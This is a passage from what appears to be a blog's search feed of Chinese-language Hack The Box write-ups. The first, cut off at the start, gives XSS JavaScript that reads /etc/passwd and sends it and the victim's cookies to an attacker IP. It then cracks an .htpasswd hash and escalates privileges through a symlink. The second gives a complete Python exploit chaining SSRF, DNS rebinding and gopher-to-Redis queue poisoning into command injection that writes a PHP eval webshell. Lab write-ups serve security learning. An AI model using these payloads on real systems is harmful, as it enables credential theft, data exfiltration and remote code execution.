href=&quot;index.php?page=messages&quot;&gt;Messages&lt;/a&gt;</code>,暴露了一个文件出来，然后再让admin去访问这个page，就会发现messages.php接受一个file&#x3D;xxxx参数，并且利用file这个参数可以读取任意文件，比如&#x2F;etc&#x2F;passwd,看看构造的js代码：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">var</span> readfile=<span class="string">&quot;http://alert.htb/messages.php?file=../../../../etc/passwd&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">  <span class="title function_">fetch</span>(readfile)</span></span><br><span class="line"><span class="language-javascript">    .<span class="title function_">then</span>(<span class="function"><span class="params">response</span> =&gt;</span> response.<span class="title function_">text</span>())</span></span><br><span class="line"><span class="language-javascript">    .<span class="title function_">then</span>(<span class="function"><span class="params">data</span> =&gt;</span> &#123;     </span></span><br><span class="line"><span class="language-javascript">      <span class="title function_">fetch</span>(<span class="string">&quot;http://10.10.16.15:1337/?data=&quot;</span> + <span class="built_in">encodeURIComponent</span>(data)+<span class="string">&quot;&amp;cookie=&quot;</span>+<span class="variable language_">document</span>.<span class="property">cookie</span>);<span class="comment">//改成你的ip,靶机可以直接和你的主机通信</span></span></span><br><span class="line"><span class="language-javascript">    &#125;)</span></span><br><span class="line"><span class="language-javascript">    .<span class="title function_">catch</span>(<span class="function"><span class="params">error</span> =&gt;</span> <span class="title function_">fetch</span>(<span class="string">&quot;http://10.10.16.15:1337/?err=&quot;</span>+error.<span class="property">message</span>));</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>step6:<br>读取&#x2F;etc&#x2F;hosts，发现还有个域名statistics.alert.htb，读取&#x2F;etc&#x2F;apache2&#x2F;sites-available&#x2F;000-default.conf (apache默认配置文件)发现这个域名要密码，<br>并且密码位于.htpasswd，根目录在&#x2F;var&#x2F;www&#x2F;statistics.alert.htb，那么再读取.htpasswd:   albert:$apr1$bMoRBJOg$igG8WBtQ1xYDTQdLjSWZQ&#x2F;<br>etc&#x2F;passwd中其实有albert这个用户，并且可以ssh<br>尝试用hashcat破解密码：.&#x2F;hashcat.exe  -m 1600 -a 0 apachehash.txt rockyou.txt   (在仓库中放着)<br>得到$apr1$bMoRBJOg$igG8WBtQ1xYDTQdLjSWZQ&#x2F;:manchesterunited</p><p>step7：<br>ssh <a href="mailto:&#x61;&#x6c;&#98;&#x65;&#114;&#116;&#64;&#x31;&#48;&#x2e;&#x31;&#48;&#x2e;&#49;&#49;&#46;&#52;&#52;">&#x61;&#x6c;&#98;&#x65;&#114;&#116;&#64;&#x31;&#48;&#x2e;&#x31;&#48;&#x2e;&#49;&#49;&#46;&#52;&#52;</a> 输入密码，ls 发现user.txt，读取user flag</p><p>step8：<br>直接读不了rootflag<br>ps aux | grep root<br>发现root运行着php的web-monitor，在127.0.0.1:8080,进入&#x2F;opt&#x2F;website-monitor&#x2F;monitors（只有它可写）<br>运行<br>touch rootflag.txt<br>ln -sf &#x2F;root&#x2F;root.txt<br>因为phpmonitor是root运行的，你访问<a href="http://127.0.0.1:8080/monitors/rootflag.txt%E5%B0%B1%E4%BC%9A%E7%94%B1%E5%85%B7%E6%9C%89root%E6%9D%83%E9%99%90%E7%9A%84%E8%BF%9B%E7%A8%8B%E5%8E%BB%E8%AF%BB%E5%8F%96%E8%BD%AF%E9%93%BE%E6%8E%A5%E7%9A%84%E6%96%87%E4%BB%B6%EF%BC%8C%E8%BF%99%E6%A0%B7%E5%B0%B1%E7%BB%95%E8%BF%87%E6%9D%83%E9%99%90%E8%AF%BB%E5%8F%96%E4%BA%86root.txt">http://127.0.0.1:8080/monitors/rootflag.txt就会由具有root权限的进程去读取软链接的文件，这样就绕过权限读取了root.txt</a></p>]]></content>
      
      
      <categories>
          
          <category> htb-machine </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>screecrack-writeup</title>
      <link href="/2024/12/08/screecrack/"/>
      <url>/2024/12/08/screecrack/</url>
      
        <content type="html"><![CDATA[<p>这道题的gethtml功能有ssrf的功能点：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SiteShotController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getHtml</span>(<span class="params">Request <span class="variable">$request</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$site</span> = <span class="variable">$request</span>-&gt;<span class="title function_ invoke__">input</span>(<span class="string">&#x27;site&#x27;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">validateurl</span>(<span class="variable">$site</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span>  <span class="title function_ invoke__">response</span>()-&gt;<span class="title function_ invoke__">json</span>([</span><br><span class="line">                <span class="string">&#x27;status&#x27;</span> =&gt; <span class="string">&#x27;failed&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;message&#x27;</span> =&gt; <span class="string">&#x27;Dont do naughty stuff.&#x27;</span></span><br><span class="line">            ]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$site</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_ invoke__">response</span>()-&gt;<span class="title function_ invoke__">json</span>([</span><br><span class="line">                <span class="string">&#x27;status&#x27;</span> =&gt; <span class="string">&#x27;failed&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;message&#x27;</span> =&gt; <span class="string">&#x27;Need site parameter&#x27;</span></span><br><span class="line">            ]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$ssSrv</span> = <span class="keyword">new</span> <span class="title class_">SiteShotService</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$ssSrv</span>-&gt;<span class="title function_ invoke__">getHtmlResp</span>(<span class="variable">$site</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>$ssSrv-&gt;getHtmlResp用了curl<br>在靶机的环境中是可以用gopher协议等等去打的<br>但是要绕过validateurl的校验，这个函数不允许传入本地ipv4地址或者不正常的域名（只能包含数字和-）<br>但是可以dns重绑定绕过这个校验，可以用nip.io这个已经预设的域名，相当强大，通过一定结构的域名可以指向任何ip</p><p>在给的附件里面的.env还可以发现跑着redis服务，redis服务是用来存储任务队列的。即filequeue</p><p>主要是下面的代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$rf</span> = <span class="keyword">new</span> <span class="title function_ invoke__">rmFile</span>(<span class="variable">$filequeue</span>);</span><br><span class="line">           <span class="title class_">Queue</span>::<span class="title function_ invoke__">push</span>(<span class="variable">$rf</span>);</span><br></pre></td></tr></table></figure><p>框架会对filequeue序列化并且转化为json格式放入redis的laravel_database_queues:default中（键名），对每一个队列中的任务执行rmfile的handle方法<br>即fileQueue-&gt;deleteFile();<br>deletefile用的是filequeue对象的uuid和txt属性去拼接一个filepath，但是实际上ssrf后uuid是可控的，因为要从redis中反序列化出这个字段，而我们是可以通过ssrf<br>去修改laravel_database_queues:default中相应索引的任务的属性来劫持反序列化的属性的，然后控制传入 system(“rm “.$filepath);的filepath参数，从而写入php shell</p><p>网上的redis攻击方法说的改config是不行的，config在高版本上了包含，dir切换不了，运行阶段是无法关闭保护的<br>可以先用在框里面输入dict:&#x2F;&#x2F;test.127-0-0-1.nip.io:6379&#x2F;info然后gethtml来测试redis联通性<br>联通后用下面的脚本去打：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> html.entities</span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line">s=<span class="string">r&#x27;&#123;&quot;uuid&quot;:&quot;1c0d0b12-641d-49ae-a8f6-5f342fa91e22&quot;,&quot;displayName&quot;:&quot;App\\Jobs\\rmFile&quot;,&quot;job&quot;:&quot;Illuminate\\Queue\\CallQueuedHandler@call&quot;,&quot;maxTries&quot;:null,&quot;maxExceptions&quot;:null,&quot;failOnTimeout&quot;:false,&quot;backoff&quot;:null,&quot;timeout&quot;:null,&quot;retryUntil&quot;:null,&quot;data&quot;:&#123;&quot;commandName&quot;:&quot;App\\Jobs\\rmFile&quot;,&quot;command&quot;:&quot;O:15:\&quot;App\\Jobs\\rmFile\&quot;:1:&#123;s:9:\&quot;fileQueue\&quot;;O:21:\&quot;App\\Message\\FileQueue\&quot;:3:&#123;s:8:\&quot;filePath\&quot;;s:35:\&quot;$(touch /www/public/shell.php).txt;\&quot;;s:4:\&quot;uuid\&quot;;s:66:\&quot;404;echo \&quot;&lt;?php eval(\\$_GET[0])&gt;\&quot; &gt; /www/public/shell.php;touch aa\&quot;;s:3:\&quot;ext\&quot;;s:3:\&quot;txt\&quot;;&#125;&#125;&quot;&#125;,&quot;id&quot;:&quot;kFmxDNJFXkM5ZFNBXWZdUfVUknKQoksy&quot;,&quot;attempts&quot;:0&#125;&#x27;</span><span class="comment">#要改uuid成别的的话自己修正一下uuid的长度，把s:66改成别的</span></span><br><span class="line">objlen=<span class="built_in">len</span>(s)</span><br><span class="line">htmlencode=urllib.parse.quote(s)</span><br><span class="line"><span class="built_in">print</span>(htmlencode)</span><br><span class="line">ssrf=<span class="string">r&quot;gopher://127-0-0-1.nip.io:6379/_&quot;</span>+((<span class="string">r&quot;*4\n$4\nlset\n$31\nlaravel_database_queues:default\n$1\n0\n$&#123;&#125;\n&#123;&#125;\n&quot;</span>.<span class="built_in">format</span>(objlen,htmlencode).replace(<span class="string">r&quot;\n&quot;</span>,<span class="string">r&quot;%0d%0a&quot;</span>)+<span class="string">r&quot;*1%0d%0a%244%0d%0aquit%0d%0a&quot;</span>))</span><br><span class="line">d=<span class="string">r&quot;dict://127-0-0-1.nip.io:6379/flushall&quot;</span></span><br><span class="line">show=<span class="string">r&quot;gopher://127-0-0-1.nip.io:6379/_&quot;</span>+((<span class="string">r&quot;*3\n$6\nlindex\n$31\nlaravel_database_queues:default\n$1\n0\n&quot;</span>.replace(<span class="string">r&quot;\n&quot;</span>,<span class="string">r&quot;%0d%0a&quot;</span>)+<span class="string">r&quot;*1%0d%0a%244%0d%0aquit%0d%0a&quot;</span>))</span><br><span class="line"><span class="built_in">print</span>(ssrf)</span><br><span class="line">flush=<span class="string">r&quot;gopher://127-0-0-1.nip.io:6379/_&quot;</span>+((<span class="string">r&quot;*1\n$8\nflushall\n&quot;</span>.replace(<span class="string">r&quot;\n&quot;</span>,<span class="string">r&quot;%0d%0a&quot;</span>)+<span class="string">r&quot;*1%0d%0a%244%0d%0aquit%0d%0a&quot;</span>))</span><br><span class="line">test=<span class="string">r&quot;gopher://127-0-0-1.nip.io:6379/_&quot;</span>+((<span class="string">r&quot;*4\n$4\nlset\n$31\nlaravel_database_queues:default\n$1\n0\n$554\n%7b%22uuid%22%3a%22812d6caf-9d25-42cd-893c-7696a493524d%22%2c%22displayName%22%3a%22App%5c%5cJobs%5c%5crmFile%22%2c%22job%22%3a%22Illuminate%5c%5cQueue%5c%5cCallQueuedHandler%40call%22%2c%22maxTries%22%3anull%2c%22maxExceptions%22%3anull%2c%22failOnTimeout%22%3afalse%2c%22backoff%22%3anull%2c%22timeout%22%3anull%2c%22retryUntil%22%3anull%2c%22data%22%3a%7b%22commandName%22%3a%22App%5c%5cJobs%5c%5crmFile%22%2c%22command%22%3a%22O%3a15%3a%5c%22App%5c%5cJobs%5c%5crmFile%5c%22%3a1%3a%7bs%3a9%3a%5c%22fileQueue%5c%22%3bO%3a21%3a%5c%22App%5c%5cMessage%5c%5cFileQueue%5c%22%3a3%3a%7bs%3a8%3a%5c%22filePath%5c%22%3bs%3a45%3a%5c%22%5c%2fsrc%5c%2f1356bb54-1c72-40fe-93ed-78fd5907af51.txt%5c%22%3bs%3a4%3a%5c%22uuid%5c%22%3bs%3a1%3a%5c%221%5c%22%3bs%3a3%3a%5c%22ext%5c%22%3bs%3a3%3a%5c%22txt%5c%22%3b%7d%7d%22%7d%2c%22id%22%3a%22SZ9ZKmfSw3zicR6kc9nvKTwL495P2iUN%22%2c%22attempts%22%3a0%7d\n&quot;</span>.replace(<span class="string">r&quot;\n&quot;</span>,<span class="string">r&quot;%0d%0a&quot;</span>).replace(<span class="string">&quot;+&quot;</span>,<span class="string">&quot;%20&quot;</span>)+<span class="string">r&quot;*1%0d%0a%244%0d%0aquit%0d%0a&quot;</span>))</span><br><span class="line">url=<span class="string">&quot;http://192.168.205.128:1337/api/get-html&quot;</span><span class="comment">#改一下ip和端口</span></span><br><span class="line">html=<span class="string">&quot;https://www.google.com/&quot;</span></span><br><span class="line">a=requests.post(url,data=&#123;<span class="string">&quot;site&quot;</span>:ssrf&#125;)</span><br><span class="line"><span class="built_in">print</span>(a.text)</span><br><span class="line">b=requests.get(<span class="string">&quot;http://192.168.205.128:1337&quot;</span>+a.json()[<span class="string">&quot;filename&quot;</span>]) <span class="comment">#改一下ip和端口</span></span><br><span class="line"><span class="built_in">print</span>(b.text)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> htb-challenge </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>test</title>
      <link href="/2024/12/08/test/"/>
      <url>/2024/12/08/test/</url>
      
        <content type="html"><![CDATA[<p>just a start on my blog</p><span id="more"></span>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
